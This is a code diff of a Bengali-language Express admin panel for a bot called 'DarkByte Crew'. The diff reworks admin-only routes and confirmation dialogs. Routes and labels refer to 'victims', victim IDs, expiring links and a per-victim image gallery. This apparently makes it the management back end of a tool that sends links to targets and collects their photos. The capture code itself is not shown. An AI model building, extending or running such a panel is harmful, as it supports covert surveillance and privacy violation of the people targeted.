-                            const minutes = parseInt(form.querySelector('input[name="minutes"]').value) || 0;
-                            const totalMs = (days * 86400000) + (hours * 3600000) + (minutes * 60000);
-                            const durationText = (days > 0 ? days + ' দিন ' : '') +
-                                               (hours > 0 ? hours + ' ঘন্টা ' : '') +
-                                               (minutes > 0 ? minutes + ' মিনিট' : '');
-                            const finalDuration = (totalMs > 0) ? durationText : 'চিরস্থায়ী';
-
-                            const title = isAllow ? 'অনুমোদন দেবেন?' : 'অনুমোদন বাতিল করবেন?';
-                            const text = isAllow ?
-                                `এই ইউজারকে অনুমোদন দিতে চান? সময়সীমা: ${finalDuration}` :
-                                'এই ইউজারের অনুমোদন বাতিল করতে চান?';
-                            const icon = isAllow ? 'question' : 'warning';
-
-                            Swal.fire({
-                                title: title,
-                                text: text,
-                                icon: icon,
-                                showCancelButton: true,
-                                confirmButtonColor: '#4f46e5',
-                                cancelButtonColor: '#6b7280',
-                                confirmButtonText: 'হ্যাঁ, নিশ্চিত',
-                                cancelButtonText: 'না, বাতিল'
-                            }).then((result) => {
-                                if (result.isConfirmed) {
-                                    form.submit();
-                                }
-                            });
-                        }
-
-                        // ডিলিট ফর্ম
-                        if (form.classList.contains('delete-form')) {
-                            e.preventDefault();
-                            Swal.fire({
-                                title: 'ইউজার ডিলিট করবেন?',
-                                text: 'এই ইউজারের সব ডেটা ডিলিট হয়ে যাবে।',
-                                icon: 'error',
-                                showCancelButton: true,
-                                confirmButtonColor: '#dc2626',
-                                cancelButtonColor: '#6b7280',
-                                confirmButtonText: 'হ্যাঁ, ডিলিট',
-                                cancelButtonText: 'না, বাতিল'
-                            }).then((result) => {
-                                if (result.isConfirmed) {
-                                    form.submit();
-                                }
-                            });
-                        }
-
-                        // নাম পরিবর্তন ফর্ম
-                        if (form.classList.contains('name-form')) {
-                            e.preventDefault();
-                            const newName = form.querySelector('input[name="newName"]').value.trim();
-                            if (!newName) {
-                                Swal.fire('ত্রুটি', 'নাম খালি রাখা যাবে না', 'error');
-                                return;
-                            }
-                            Swal.fire({
-                                title: 'নাম পরিবর্তন করবেন?',
-                                text: 'নতুন নাম: ' + newName,
-                                icon: 'question',
-                                showCancelButton: true,
-                                confirmButtonColor: '#4f46e5',
-                                cancelButtonColor: '#6b7280',
-                                confirmButtonText: 'হ্যাঁ, পরিবর্তন',
-                                cancelButtonText: 'না, বাতিল'
-                            }).then((result) => {
-                                if (result.isConfirmed) {
-                                    form.submit();
-                                }
-                            });
-                        }
-
-                        // লিংক এক্সপায়ার ফর্ম
-                        if (form.classList.contains('expire-form')) {
-                            e.preventDefault();
-                            Swal.fire({
-                                title: 'লিংক এক্সপায়ার করবেন?',
-                                text: 'এই লিংকটি আর কাজ করবে না।',
-                                icon: 'warning',
-                                showCancelButton: true,
-                                confirmButtonColor: '#dc2626',
-                                cancelButtonColor: '#6b7280',
-                                confirmButtonText: 'হ্যাঁ, এক্সপায়ার',
-                                cancelButtonText: 'না, বাতিল'
-                            }).then((result) => {
-                                if (result.isConfirmed) {
-                                    form.submit();
-                                }
-                            });
-                        }
-
-                        // কনফিগ সেভ ফর্ম
-                        if (form.classList.contains('config-form')) {
-                            e.preventDefault();
-                            Swal.fire({
-                                title: 'কনফিগ সেভ করবেন?',
-                                text: 'নতুন সেটিংস সংরক্ষণ করা হবে।',
-                                icon: 'question',
-                                showCancelButton: true,
-                                confirmButtonColor: '#4f46e5',
-                                cancelButtonColor: '#6b7280',
-                                confirmButtonText: 'হ্যাঁ, সেভ',
-                                cancelButtonText: 'না, বাতিল'
-                            }).then((result) => {
-                                if (result.isConfirmed) {
-                                    form.submit();
-                                }
-                            });
-                        }
+                    // ডিউরেশন সিলেক্ট চেইঞ্জ হলে hidden ইনপুট আপডেট
+                    document.querySelectorAll('.duration-select').forEach(select => {
+                        select.addEventListener('change', function() {
+                            const form = this.closest('form');
+                            const hiddenInput = form.querySelector('input[name="duration"]');
+                            if (hiddenInput) hiddenInput.value = this.value;
+                        });
                     });
-
                 })();
             </script>
         </body>
@@ -699,11 +779,12 @@ async function renderDashboard(req, res) {
 }
 
 // ================================================================
-// POST রাউটস (সমস্ত কার্যক্রম)
+// POST রাউটস (এগুলো আগের মতোই)
 // ================================================================
 
 // 1. কনফিগ আপডেট
-router.post('/admin/update-config', isAdmin, async (req, res) => {
+router.post('/admin/update-config', async (req, res) => {
+    if (!req.session.isAdmin) return res.redirect('/admin');
     try {
         let config = await Config.findOne({ key: 'bot_config' });
         if (!config) config = new Config({ key: 'bot_config' });
@@ -719,11 +800,12 @@ router.post('/admin/update-config', isAdmin, async (req, res) => {
     }
 });
 
-// 2. ইউজার টগল – দিন/ঘন্টা/মিনিট থেকে সময় ক্যালকুলেশন
-router.post('/admin/toggle-user', isAdmin, async (req, res) => {
+// 2. ইউজার টগল
+router.post('/admin/toggle-user', async (req, res) => {
+    if (!req.session.isAdmin) return res.redirect('/admin');
     try {
-        const { userId, action, days, hours, minutes } = req.body;
-        console.log(`🔄 ইউজার টগল: ${userId} → ${action}, দিন: ${days}, ঘন্টা: ${hours}, মিনিট: ${minutes}`);
+        const { userId, action, duration } = req.body;
+        console.log(`🔄 ইউজার টগল: ${userId} → ${action}, duration: ${duration}`);
 
         const user = await User.findOne({ fbId: userId });
         if (!user) {
@@ -731,19 +813,28 @@ router.post('/admin/toggle-user', isAdmin, async (req, res) => {
         }
 
         const wasAllowed = user.allowed;
-        const now = new Date();
 
         if (action === 'allow') {
             user.allowed = true;
-            const daysNum = parseInt(days) || 0;
-            const hoursNum = parseInt(hours) || 0;
-            const minutesNum = parseInt(minutes) || 0;
-            const totalMs = (daysNum * 86400000) + (hoursNum * 3600000) + (minutesNum * 60000);
-
-            if (totalMs > 0) {
-                user.permissionExpiresAt = new Date(now.getTime() + totalMs);
+            if (duration) {
+                const durationMap = {
+                    '1h': 60 * 60 * 1000,
+                    '6h': 6 * 60 * 60 * 1000,
+                    '12h': 12 * 60 * 60 * 1000,
+                    '1d': 24 * 60 * 60 * 1000,
+                    '7d': 7 * 24 * 60 * 60 * 1000,
+                    '30d': 30 * 24 * 60 * 60 * 1000,
+                    '90d': 90 * 24 * 60 * 60 * 1000,
+                    '365d': 365 * 24 * 60 * 60 * 1000
+                };
+                const ms = durationMap[duration];
+                if (ms) {
+                    user.permissionExpiresAt = new Date(Date.now() + ms);
+                } else {
+                    user.permissionExpiresAt = null;
+                }
             } else {
-                user.permissionExpiresAt = null; // চিরস্থায়ী
+                user.permissionExpiresAt = null;
             }
         } else {
             user.allowed = false;
@@ -751,15 +842,13 @@ router.post('/admin/toggle-user', isAdmin, async (req, res) => {
         }
         await user.save();
 
-        // অনুমোদন মেসেজ
         if (action === 'allow' && !wasAllowed) {
             const fullName = user.firstName || 'বন্ধু';
-            const durationText = (parseInt(days) || 0) + ' দিন ' + (parseInt(hours) || 0) + ' ঘন্টা ' + (parseInt(minutes) || 0) + ' মিনিট';
+            const expiryText = user.permissionExpiresAt ? new Date(user.permissionExpiresAt).toLocaleString('bn-BD') : 'চিরস্থায়ী';
             const msg = `🎉 অভিনন্দন, ${fullName}! 🥳
 
 আপনাকে DarkByte Crew বটের অ্যাক্সেস দেওয়া হয়েছে। 🔓
-⏰ সময়সীমা: ${durationText}
-${user.permissionExpiresAt ? `এক্সপাইরি তারিখ: ${new Date(user.permissionExpiresAt).toLocaleString('bn-BD')}` : 'চিরস্থায়ী অ্যাক্সেস'}
+⏰ এক্সপাইরি: ${expiryText}
 
 এখন থেকে আপনি বটের সকল ফিচার ও কমান্ড ব্যবহার করতে পারবেন।
 
@@ -782,7 +871,8 @@ ${user.permissionExpiresAt ? `এক্সপাইরি তারিখ: ${new
 });
 
 // 3. ইউজারের নাম পরিবর্তন
-router.post('/admin/update-name', isAdmin, async (req, res) => {
+router.post('/admin/update-name', async (req, res) => {
+    if (!req.session.isAdmin) return res.redirect('/admin');
     try {
         const { userId, newName } = req.body;
         if (!userId || !newName) {
@@ -803,7 +893,8 @@ router.post('/admin/update-name', isAdmin, async (req, res) => {
 });
 
 // 4. লিংক এক্সপায়ার
-router.post('/admin/expire-link', isAdmin, async (req, res) => {
+router.post('/admin/expire-link', async (req, res) => {
+    if (!req.session.isAdmin) return res.redirect('/admin');
     try {
         const { victimId } = req.body;
         if (!victimId) {
@@ -824,7 +915,8 @@ router.post('/admin/expire-link', isAdmin, async (req, res) => {
 });
 
 // 5. ইউজার ডিলিট
-router.post('/admin/delete-user', isAdmin, async (req, res) => {
+router.post('/admin/delete-user', async (req, res) => {
+    if (!req.session.isAdmin) return res.redirect('/admin');
     try {
         const { userId } = req.body;
         if (!userId) {
@@ -842,9 +934,10 @@ router.post('/admin/delete-user', isAdmin, async (req, res) => {
 });
 
 // ============================
-// ভিক্টিম গ্যালারি ভিউ
+// ভিক্টিম গ্যালারি ভিউ (আলাদা পেজ)
 // ============================
-router.get('/admin/victim/:id', isAdmin, async (req, res) => {
+router.get('/admin/victim/:id', async (req, res) => {
+    if (!req.session.isAdmin) return res.redirect('/admin');
     try {
         const victim = await Victim.findOne({ id: req.params.id });
         if (!victim) {
@@ -879,25 +972,45 @@ router.get('/admin/victim/:id', isAdmin, async (req, res) => {
                     body { font-family: 'Inter', sans-serif; background: #f4f6fa; padding: 24px; color: #111827; }
                     .container { max-width: 1200px; margin:0 auto; }
                     .header {
-                        display: flex; justify-content: space-between; align-items: center;
-                        background: #ffffff; padding: 18px 28px; border-radius: 16px; margin-bottom: 28px;
-                        border: 1px solid #eef2f6; flex-wrap: wrap; gap: 12px;
+                        display: flex;
+                        justify-content: space-between;
+                        align-items: center;
+                        background: #ffffff;
+                        padding: 18px 28px;
+                        border-radius: 16px;
+                        margin-bottom: 28px;
+                        border: 1px solid #eef2f6;
+                        flex-wrap: wrap;
+                        gap: 12px;
                     }
                     .header h2 { font-weight: 600; font-size: 20px; }
                     .header h2 i { color: #4f46e5; margin-right: 10px; }
                     .header .sub { color: #6b7280; font-size: 14px; }
                     .btn-back {
-                        background: #eef2ff; color: #4f46e5; padding: 10px 22px; border-radius: 12px;
-                        text-decoration: none; font-weight: 500; display: inline-flex; align-items: center; gap: 8px;
+                        background: #eef2ff;
+                        color: #4f46e5;
+                        padding: 10px 22px;
+                        border-radius: 12px;
+                        text-decoration: none;
+                        font-weight: 500;
+                        display: inline-flex;
+                        align-items: center;
+                        gap: 8px;
                         transition: 0.2s;
                     }
                     .btn-back:hover { background: #dbeafe; }
                     .gallery {
-                        display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: 20px;
+                        display: grid;
+                        grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+                        gap: 20px;
                     }
                     .gallery-item {
-                        background: #ffffff; border-radius: 16px; overflow: hidden; border: 1px solid #eef2f6;
-                        box-shadow: 0 2px 8px rgba(0,0,0,0.04); transition: 0.2s;
+                        background: #ffffff;
+                        border-radius: 16px;
+                        overflow: hidden;
+                        border: 1px solid #eef2f6;
+                        box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+                        transition: 0.2s;
                     }
                     .gallery-item:hover { transform: translateY(-4px); box-shadow: 0 12px 24px rgba(0,0,0,0.08); }
                     .gallery-item img { width: 100%; height: 200px; object-fit: cover; display: block; }
